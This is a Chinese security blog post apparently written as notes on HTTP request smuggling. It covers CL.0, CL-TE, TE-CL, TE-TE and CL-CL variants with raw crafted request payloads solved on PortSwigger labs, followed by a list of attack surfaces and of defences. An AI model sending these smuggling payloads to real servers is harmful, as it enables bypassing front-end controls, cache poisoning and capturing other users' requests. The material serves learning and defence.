<!DOCTYPE html>
<html lang="zh-cn">
  <head>
    <meta charset="utf8" />
    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
    <title>
      
        http走私笔记 | 东隅's blog
      
    </title>
    <meta name="description" content=""/>
    <meta name="keywords" content=""/>
    
      <link rel="apple-touch-icon"
            sizes="180x180"
            href="/images/jocker.png"/>
    
    
      <link rel="icon"
            type="image/png"
            sizes="32x32"
            href="/images/jocker.png"/>
    
    
      <link rel="icon"
            type="image/png"
            sizes="16x16"
            href="/images/jocker.png"/>
    
    
      <link rel="mask-icon"
            href="/images/jocker.png"
            color=""/>
    
    
    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
    
    
  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
  

  <meta name="generator" content="Hexo 5.4.0"></head>
  <body>
    <div class="head">
      <div class="nav">
        <a href="/" class="nav-logo">
          <img alt="logo" height="60px" width="60px" src="/images/jocker.png" />
        </a>
        <input id="navBtn" type="checkbox"/>
        <div class="nav-menu">
          
            
              <a class="nav-menu-item" href="/%E5%AE%89%E5%85%A8">安全</a>
            
              <a class="nav-menu-item" href="/%E5%BC%80%E5%8F%91">开发</a>
            
              <a class="nav-menu-item" href="/%E7%94%9F%E6%B4%BB">生活</a>
            
          
        </div>
        <label class="nav-btn" for="navBtn"></label>
      </div>
    </div>
    <div class="body">
      
  <article class="post-content">
    <div class="post-inner">
      <div class="post-content__head">
        <div class="post-title">http走私笔记</div>
        <div class="post-info">
          
  
    <a href="/tags/OWASP/" class="post-tag">#OWASP</a>
  
    <a href="/tags/http%E8%B5%B0%E7%A7%81/" class="post-tag">#http走私</a>
  


          <span class="post-date">2023-06-15</span>
        </div>
      </div>
      <div id="postBody" class="post-content__body--toc">
        <div id="tocAnchor" class="toc-anchor">
          <ol id="toc" class="post-toc">
            
              <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP1-1-Connection-Mod"><span class="toc-text">HTTP1.1 Connection Mod</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Keep-Alive"><span class="toc-text">Keep-Alive</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pipline"><span class="toc-text">Pipline</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Message-Body"><span class="toc-text">Message Body</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Transfer-Encoding"><span class="toc-text">Transfer-Encoding</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Content-Length"><span class="toc-text">Content-Length</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E2%BE%9B%E7%A7%81"><span class="toc-text">请求⾛私</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%A7%E2%BD%A3%E5%8E%9F%E5%9B%A0"><span class="toc-text">产⽣原因</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E2%BB%85%E2%BE%9B%E7%A7%81%E8%AF%B7%E6%B1%82"><span class="toc-text">常⻅⾛私请求</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-CL%E4%B8%8D%E4%B8%BA0%E7%9A%84GET%E8%AF%B7%E6%B1%82"><span class="toc-text">0x01 CL不为0的GET请求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-CL-TE"><span class="toc-text">0x02 CL-TE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-TE-CL"><span class="toc-text">0x03 TE-CL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-TE-TE"><span class="toc-text">0x04 TE-TE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-CL-CL"><span class="toc-text">0x05 CL-CL</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-text">攻击面</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-text">防御</span></a></li></ol>
            
          </ol>
        </div>
        
          <div class="post-gallery">
            
          </div>
        
        <p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11423">https://xz.aliyun.com/t/11423</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/">https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/</a></p>
<h1 id="HTTP1-1-Connection-Mod"><a href="#HTTP1-1-Connection-Mod" class="headerlink" title="HTTP1.1 Connection Mod"></a>HTTP1.1 Connection Mod</h1><p>前置服务器与后端服务器往往是在可靠的网络域中，ip 也是相对固定的，所以可以重用 TCP 连接来减少频繁 TCP 握手带来的开销。这里就用到了 HTTP1.1 中的 <code>Keep-Alive</code> 和 <code>Pipeline</code> 特性：</p>
<h2 id="Keep-Alive"><a href="#Keep-Alive" class="headerlink" title="Keep-Alive"></a>Keep-Alive</h2><p>在 HTTP/1.1 中默认使⽤<code>Keep-Alive</code>，从⽽允许在单个连接上承载多个请求和响应告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后⾯对相同⽬标服务器的HTTP请求，==重⽤==这⼀个TCP链接，这样只需要进⾏⼀次TCP握⼿的过程，可以减少服务器的开销，节约资源，还能加快访问速度</p>
<h2 id="Pipline"><a href="#Pipline" class="headerlink" title="Pipline"></a>Pipline</h2><p>在⼀个Tcp连接中发送多个请求客户端可以像流⽔线⼀样发送⾃⼰的HTTP请求，⽽不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先⼊先出机制，将请求和响应严格对应起来，再将响应发送给客户端。</p>
<img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306171723131.webp" alt="image-20230617172300787" style="zoom:67%;" />



<h1 id="Message-Body"><a href="#Message-Body" class="headerlink" title="Message Body"></a>Message Body</h1><h2 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h2><p>在HTTP的情况下，<code>Transfer-Encoding</code> 的主要⽤来以指定的编码形式编码payload body 安全地传输给⽤户。在 HTTP/1.1 中引⼊，在 HTTP/2 中取消MDN 列举了⼏种属性：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunked | compress | deflate | gzip | identity</span><br></pre></td></tr></table></figure>

<p>我们这⾥主要关注 <code>chunked</code> 这⼀种传输编码⽅式，它在⽹络攻击中也不是第⼀次提及了，之前就有师傅利⽤这个字段去绕过⼀些 WAF，可以参考 <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/194351.html">利⽤分块传输吊打所有WAF</a> </p>
<p><code>Transfer-Encoding</code>标头⽤于指定消息体使⽤分块编码（Chunked Encode），也就是说消息报⽂由⼀个或多个数据块组成，每个数据块⼤⼩以字节为单位（⼗六进制表⽰） 衡量，后跟换⾏符，然后是块内容</p>
<p>最重要的是：整个消息体以⼤⼩为0的块结束，也就是说==解析遇到0数据块就结束==。如：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POSTT /xxx HTTP/<span class="number">1.1</span></span><br><span class="line">Host: xxx</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"><span class="number">4</span>\r\n</span><br><span class="line">Wiki\r\n</span><br><span class="line"><span class="number">5</span>\r\n</span><br><span class="line">pedia\r\n</span><br><span class="line">e\r\n</span><br><span class="line">in\r\n\r\nchunks.\r\n</span><br><span class="line"><span class="number">0</span>\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306171728264.webp" alt="image-20230617172840924" style="zoom:50%;" />



<h2 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h2><p>HTTP包的⼀个标头，⽤来指明发送给接收⽅的消息的⼤⼩</p>
<h1 id="请求⾛私"><a href="#请求⾛私" class="headerlink" title="请求⾛私"></a>请求⾛私</h1><p>为了提升⽤户的浏览速度，提⾼使⽤体验，减轻服务器的负担，很多⽹站都⽤了CDN加速服务</p>
<p>最简单的加速服务，就是在源站的前⾯加上⼀个具有缓存功能的反向代理服务器</p>
<p>⽤户在请求某些静态资源时，直接从代理服务器中就可以获取到，不⽤再从源站所在服务器获取。这就有了⼀个很典型的拓扑结构<br><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306171730743.webp" alt="image-20230617173038543" style="zoom:67%;" /></p>
<p>⼀般来说，反向代理服务器与后端的源站服务器之间，会重⽤TCP链接。</p>
<p>这也很容易理解，⽤户的分布范围是⼗分⼴泛，建⽴连接的时间也是不确定的，这样TCP链接就很难重⽤</p>
<p>⽽代理服务器与后端的源站服务器的IP地址是相对固定，不同⽤户的请求通过代理服务器与源站服务器建⽴链接，这两者之间的TCP链接进⾏重⽤，也就顺理成章了</p>
<h2 id="产⽣原因"><a href="#产⽣原因" class="headerlink" title="产⽣原因"></a>产⽣原因</h2><p>HTTP请求⾛私漏洞的原因是由于HTTP规范提供了两种不同⽅式来指定请求的结束位置，它们是<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头<br>⼀般在前后端服务器分离或存在CDN加速服务的情况下<br>⼀般是后端和前端==对于请求的结束认证不⼀致==导致的，相当于后端对于第⼀个包产⽣了截断，前者正常处理，后者就会和第⼆个包进⾏拼接，这样就对第⼆个包造成了影响</p>
<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306171733605.webp" alt="image-20230617173316425"></p>
<p>其实理解起来真的很简单，相当于我发送请求，包含<code>Content-Length</code>，前端服务器解析后没有问题发送给后端服务器</p>
<p>但是我在请求时后⾯还包含了<code>Transfer-Encoding</code>，这样后端服务器进⾏解析便可执⾏我写在下⾯的⼀些命令，这样便可以绕过前端的waf</p>
<h1 id="常⻅⾛私请求"><a href="#常⻅⾛私请求" class="headerlink" title="常⻅⾛私请求"></a>常⻅⾛私请求</h1><h2 id="0x01-CL不为0的GET请求"><a href="#0x01-CL不为0的GET请求" class="headerlink" title="0x01 CL不为0的GET请求"></a>0x01 CL不为0的GET请求</h2><p>假设==前端代理服务器允许GET请求携带请求体，⽽后端服务器不允许GET请求携带请求体==，它会直接==忽略==掉GET请求中的<code>Content-Length</code>头，不进⾏处理。这就有可能导致请求⾛私</p>
<p>==这⾥CL的计算，\r\n算两个⻓度的，可以直接bp⾃动计算==</p>
<p>⽐如构造如下请求：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: <span class="number">41</span>\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /secret HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p>⾸先前端接受到这个请求，然后读取CL，判断这是⼀个完整的请求</p>
<p>portswigger的靶场试了⼀下，正常情况访问得到svg的内容</p>
<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306171736440.webp" alt="image-20230617173641149"></p>
<p>使⽤请求⾛私，可以看到成功请求到了admin</p>
<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306171739937.webp" alt="image-20230617173946610"></p>
<h2 id="0x02-CL-TE"><a href="#0x02-CL-TE" class="headerlink" title="0x02 CL-TE"></a>0x02 CL-TE</h2><p>所谓CL-TE，就是当收到存在两个请求头的请求包时，==前端代理服务器只处理Content-Length这⼀请求头==，⽽==后端服务器会遵守RFC2616的规定，忽略掉Content-Length，处理Transfer-Encoding==这⼀请求头</p>
<p>继续在实验靶场来做，⽬标是使⽤⼀个GPOST请求⽅法来对⽹站进⾏⼀次请求</p>
<blockquote>
<p>这个实验室涉及前端和后端服务器，前端服务器不⽀持分块编码。前端服务器拒绝不使⽤<code>GET</code>或<code>POST</code>⽅法的请求。</p>
<p>要解决实验室问题，请将请求⾛私到后端服务器，以便后端服务器处理的下⼀个请求似乎使⽤<code>GPOST</code>⽅法</p>
</blockquote>
<p>我们发这样的包，第⼀次发，正常返回</p>
<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306171743575.webp" alt="image-20230617174316298"></p>
<p>我们再次发包，这⾥后端服务器读到0就会截⽌，前⼀次我们发的包就结束了。然后下⾯的G就拼接到我们第⼆次发的包⾥⾯了，也就变成了<code>GPOST /HTTP/1.1</code></p>
<p>发包可以成功看到我们这⾥是成功发了GPOST请求⽅法的包</p>
<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306171744212.webp" alt="image-20230617174402961"></p>
<p>通过这个题⽬我们来细究⼀下过程</p>
<p>⾸先这是我们发的包</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.net</span><br><span class="line">Content-Type: application/<span class="keyword">x</span>-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">6</span></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">\r\n</span><br><span class="line"><span class="number">0</span>\r\n</span><br><span class="line">\r\n</span><br><span class="line">G\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p>第⼀次发包，前端优先认CL，这⾥我们CL为6，所以前端会认为请求的body是下⾯的六个字节，然后会将这个请求当作⼀个完整的请求转发到后端</p>
<figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure>

<p>由于后端优先认TE，我们这⾥设置的是chunked，表⽰可以分块传输，⽽且每⼀个完整包由⼀个0来结束，所以他接收到我们的包后，遇到0，截断包</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.net</span><br><span class="line">Content-Type: application/<span class="keyword">x</span>-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">6</span></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>多出来的G，先放着，等待下⼀个包过来的时候进⾏拼接传输</p>
<p>所以此时我们发送第⼆个包，G就会拼上POST，请求⽅式就变成了GPOST</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">G+POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.net</span><br><span class="line">Content-Type: application/<span class="keyword">x</span>-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">6</span></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">\r\n</span><br><span class="line"><span class="number">0</span>\r\n</span><br><span class="line">\r\n</span><br><span class="line">G\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<h2 id="0x03-TE-CL"><a href="#0x03-TE-CL" class="headerlink" title="0x03 TE-CL"></a>0x03 TE-CL</h2><p>前端服务器只处理Transfer-Encoding请求头，后端处理Content-Length请求头</p>
<p>这样的话我们传这样的包</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: 0ace000303500427c1ca9251007600ac.web-security-academy.net</span><br><span class="line">Cookie: session=JIdyZSjueulLj131gMLMFLVZZq4PQ1wH</span><br><span class="line">Content-Length: <span class="number">4</span></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">\r\n</span><br><span class="line"><span class="number">12</span>\r\n</span><br><span class="line">GPOST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="number">0</span>\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p>前端识别TE，把整个包传⼊到后端</p>
<p>然后后端识别CL，这⾥为4，所以只识别到12</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: 0ace000303500427c1ca9251007600ac.web-security-academy.net</span><br><span class="line">Cookie: session=JIdyZSjueulLj131gMLMFLVZZq4PQ1wH</span><br><span class="line">Content-Length: <span class="number">4</span></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">\r\n</span><br><span class="line"><span class="number">12</span>\r\n</span><br></pre></td></tr></table></figure>

<p>后⾯的<code>GPOST / HTTP/1.1</code> 就作为下⼀个包发出，也就成功⾛私了</p>
<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306171748173.webp" alt="image-20230617174817887"></p>
<h2 id="0x04-TE-TE"><a href="#0x04-TE-TE" class="headerlink" title="0x04 TE-TE"></a>0x04 TE-TE</h2><p>其实这个场景也可以认为是相同字段的场景处理，⽐如说在处理两个 TE 字段，如果取第⼆个 TE 字段作为解析标准，⽽第⼆个字段值⾮正常或者解析出错，就可能会忽略掉 TE 字段，⽽使⽤ CL 字段进⾏解析</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: acfd1f201f5fb528809b582e004200a3.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.15</span>; rv:<span class="number">70.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">70.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">9</span>,*<span class="regexp">/*;q=0.8</span></span><br><span class="line"><span class="regexp">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="regexp">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="regexp">Connection: close</span></span><br><span class="line"><span class="regexp">Cookie: session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQ</span></span><br><span class="line"><span class="regexp">Cache-Control: max-age=0</span></span><br><span class="line"><span class="regexp">Content-length: 4</span></span><br><span class="line"><span class="regexp">Transfer-Encoding: chunked</span></span><br><span class="line"><span class="regexp">Transfer-encoding: nothing</span></span><br><span class="line"><span class="regexp">\r\n</span></span><br><span class="line"><span class="regexp">12\r\n</span></span><br><span class="line"><span class="regexp">GPOST /</span> HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="number">0</span>\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p>这⾥⽤了两个 TE 字段，并且第⼆个 TE 字段值⾮标准值，这⾥ 前端 选择对第⼀个 TE 进⾏优先处理，整个请求则为正常请求，会转发给 后端 服务器</p>
<p>⽽ 后段 服务器以第⼆个 TE 进⾏优先处理，⽽第⼆个 TE 值⾮正常，则会取 CL 字段进⾏处理，这样这个请求就会因为 CL 字段设置的值 4 ⽽被拆分为两个请求</p>
<p>第⼀个请求：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: acfd1f201f5fb528809b582e004200a3.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.15</span>; rv:<span class="number">70.0</span>) Gecko/<span class="number">20</span></span><br><span class="line"><span class="number">100101</span> Firefox/<span class="number">70.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">9</span>,*/*;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line">Accept-Language: zh-CN,zh;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">8</span>,zh-TW;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">7</span>,zh-HK;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">5</span>,en-US;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">3</span>,en;<span class="keyword">q</span>=<span class="number">0</span>.</span><br><span class="line"><span class="number">2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: <span class="keyword">close</span></span><br><span class="line">Cookie: session=<span class="number">9</span>swxitdhJRXeFhq77wGSU7fKw0VTiuzQ</span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Content-<span class="keyword">length</span>: <span class="number">4</span></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-encoding: nothing</span><br><span class="line">\r\n</span><br><span class="line"><span class="number">12</span>\r\n</span><br></pre></td></tr></table></figure>

<p>第二个请求</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/<span class="number">1.1</span></span><br><span class="line">\r\n</span><br><span class="line"><span class="number">0</span>\r\n</span><br></pre></td></tr></table></figure>



<h2 id="0x05-CL-CL"><a href="#0x05-CL-CL" class="headerlink" title="0x05 CL-CL"></a>0x05 CL-CL</h2><p>中间代理服务器按照第⼀个Content-Length的值对请求进⾏处理，⽽后端源站服务器按照第⼆个Content-Length的值进⾏处理</p>
<p>例如：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: <span class="number">8</span>\r\n</span><br><span class="line">Content-Length: <span class="number">7</span>\r\n</span><br><span class="line"><span class="number">12345</span>\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>

<p>代理服务器识别第⼀个，⻓度为8，把完整的请求发送到后端后端识别第⼆个，⻓度为7，读到123456就截⽌，⽽此时的缓冲区去还剩余⼀个字⺟<code>a</code>，对于后端服务器来说，这个<code>a</code>是下⼀个请求的⼀部分，但是还没有传输完毕。此时恰巧有⼀个其他的正常⽤户对服务器进⾏了请求，假设请求如图所⽰。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure>

<p>这时候正常⽤户的请求就拼接到了字⺟<code>a</code>的后⾯，当后端服务器接收完毕后，它实际处理的请求其实是</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGET /index.html HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure>



<h1 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h1><ul>
<li>绕过前置服务器的安全限制</li>
<li>获取前置服务器修改过的请求字段</li>
<li>获取其他用户的请求</li>
<li>反射型 XSS 组合拳</li>
<li>将 on-site 重定向变为开放式重定向</li>
<li>缓存投毒</li>
<li>缓存欺骗</li>
</ul>
<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><blockquote>
<ul>
<li>禁用代理服务器与后端服务器之间的 TCP 连接重用</li>
<li>使用 HTTP/2 协议</li>
<li>前后端使用相同的服务器</li>
</ul>
<p>以上的措施有的不能从根本上解决问题，而且有着很多不足，就比如禁用代理服务器和后端服务器之间的 TCP 连接重用，会增大后端服务器的压力。使用 HTTP/2 在现在的网络条件下根本无法推广使用，哪怕支持 HTTP/2 协议的服务器也会兼容 HTTP/1.1。从本质上来说，==HTTP 请求走私出现的原因并不是协议设计的问题，而是不同服务器实现的问题==，个人认为最好的解决方案就是严格的实现 RFC7230-7235 中所规定的的标准，但这也是最难做到的。</p>
</blockquote>
<p>对于 HTTP/2 能避免请求走私的原理，根据 @ZeddYu 师傅的<a target="_blank" rel="noopener" href="https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/#Defence">描述</a>，我去查了一下<a target="_blank" rel="noopener" href="https://developers.google.com/web/fundamentals/performance/http2">HTTP/2 简介</a>，总结一下，HTTP/1.1 的一些特性为请求走私创造了条件：</p>
<ol>
<li>纯文本，以换行符作为分隔符</li>
<li>序列和阻塞机制</li>
</ol>
<p>而在 HTTP/2 中已经没有了产生请求走私的机会：</p>
<ol>
<li>使用<strong>二进制编码</strong>且分割为更小的传输单位（帧，拥有编号，<strong>可乱序传输</strong>）</li>
<li><strong>同一个来源的所有通信都在一个 TCP 连接上完成</strong>，此连接可以承载任意数量的双向数据流</li>
</ol>

      </div>
    </div>
  </article>
  <div class="post__foot">
    
    <div class="post-nav">
  
    <a class="post-nav-item-left" href="/2023/06/19/mysql8%E6%96%B0%E7%89%B9%E6%80%A7/">
      <div class="text-align">
        <svg t="1670570876164"
             class="icon"
             viewBox="0 0 1024 1024"
             width="16"
             height="16">
          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
        </svg>
        <span class="text-small">上一篇</span>
      </div>
      <div>mysql8新特性</div>
    </a>
  
  <div class="vhr"></div>
  
    <a class="post-nav-item-right" href="/2023/06/09/7.29/yccms_v3.4/">
      <div class="text-align">
        <span class="text-small">下一篇</span>
        <svg t="1670570876164"
             class="icon"
             viewBox="0 0 1024 1024"
             transform="scale(-1,-1)"
             width="16"
             height="16">
          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
        </svg>
      </div>
      yccms_v3.4审计
    </a>
  
</div>

    
    
  </div>

    </div>
    <div class="foot">
      <div class="foot-inner">
        <div class="foot__head">
          
            <div class="foot-line">
              <div class="matts">安</div><div class="matts">得</div><div class="matts">倚</div><div class="matts">天</div><div class="matts">剑</div>
            </div>
          
            <div class="foot-line">
              <div class="matts">跨</div><div class="matts">海</div><div class="matts">斩</div><div class="matts">长</div><div class="matts">鲸</div>
            </div>
          
        </div>
        <div class="foot__body">
          
